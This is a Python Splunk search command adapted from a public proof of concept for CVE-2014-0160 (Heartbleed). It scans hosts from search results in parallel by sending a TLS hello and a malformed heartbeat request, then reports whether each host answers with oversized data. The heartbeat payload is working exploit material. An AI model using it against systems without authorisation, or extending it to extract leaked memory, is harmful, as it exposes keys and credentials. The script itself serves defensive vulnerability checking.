#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Modified for simplified checking by Yonathan Klijnsma

# Modified to work with Splunk by Discovered Intelligence Inc.

import sys
import struct
import socket
import time
import select
import re
import splunk.Intersplunk

target = None

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

###
###



def argwrapper(args):
    '''
    rapper function for multiple arguments
    '''
    return args[0](*args[1:])


def unquote(val):
    if val is not None and len(val) > 1 and val.startswith('"') and val.endswith('"'):
       return val[1:-1]
    return val

def getarg(argvals, name, defaultVal=None):
    return unquote(argvals.get(name, defaultVal))

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None

    return typ, ver, pay

def hit_hb(s):
    global target
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return (False,'NOT VULNERABLE')

        if typ == 24:
            if len(pay) > 3:
                return (True,'VULNERABLE')
            else:
                return (True,'NOT VULNERABLE')
        #return True

        if typ == 21:
            return (False,'NOT VULNERABLE')

def hb_test(t,h,p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(t)
    sys.stdout.flush()
    try:
        s.connect((h, p))
    except socket.timeout as msg:
        s.close()
        s = None
        return 'TIMEOUT'
    except socket.error, (value,message):
        if s:
           s.close()
           s = None
        return 'Socket error: ' + message
    try:
        target = h
        sys.stdout.flush()
        s.send(hello)
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                return 'UNKNOWN'
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break

        sys.stdout.flush()
        s.send(hb)
        a,b = hit_hb(s)
        return b
    except socket.error, (value,message):
        if s:
            s.close()
            s = None
        return 'Socket error: ' + message

global target

try:
    results, dummyresults, settings = splunk.Intersplunk.getOrganizedResults()
    keywords, argvals               = splunk.Intersplunk.getKeywordsAndOptions()

    server_f  = getarg(argvals, "serverfield", "dest")
    port_f    = getarg(argvals, "portfield", "port")
    t         = int(getarg(argvals, "timeout", "3"))
    poolsize  = int(getarg(argvals, "poolsize", "10"))

    PoolSupport=True
    from multiprocessing import Pool

    try:
        p = Pool(1)
    except:
    	PoolSupport=False

    func_args=[]
    ret = []

    for result in results:
        port_val = 443

        if port_f in result.keys():
            if len(result[port_f]):
               	port_val = result[port_f]
            else:
                port_val = 443

        if server_f not in result.keys():
    	   continue

        if result[server_f] == "":
    	   continue

        if PoolSupport:
            func_args.append( (hb_test, t, result[server_f], int(port_val)))
        else:
            result["vulnerable"] = hb_test(t,result[server_f],int(port_val))
            
    if PoolSupport:
        if poolsize<1:
            poolsize=1
        p = Pool(poolsize)
        ret = p.map(argwrapper, func_args)

        i = 0
        for result in results:
            if server_f not in result.keys():
        	   continue

            if result[server_f] == "":
        	   continue

            result["vulnerable"] = ret[i]
            i=i+1

    splunk.Intersplunk.outputResults(results)

except Exception, e:
    import traceback
    stack =  traceback.format_exc()
    results = splunk.Intersplunk.generateErrorResults(
            str(e) + ". Traceback: " + str(stack))